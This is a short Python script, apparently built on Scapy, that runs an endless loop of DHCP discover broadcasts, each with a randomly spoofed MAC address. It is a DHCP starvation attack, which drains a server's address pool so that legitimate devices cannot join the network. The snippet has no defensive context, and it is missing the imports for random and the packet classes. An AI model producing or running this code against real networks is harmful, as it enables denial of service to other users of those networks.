import time

def send_dhcp_request():
    while True:
        fake_mac = "00:11:22:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
        )
        dhcp_discover = (
            Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=bytes.fromhex(fake_mac.replace(":", ""))) /
            DHCP(options=[("message-type", "discover"), "end"])
        )

        sendp(dhcp_discover, verbose=False)
        time.sleep(0.1)  # <- to avoid locking up your system
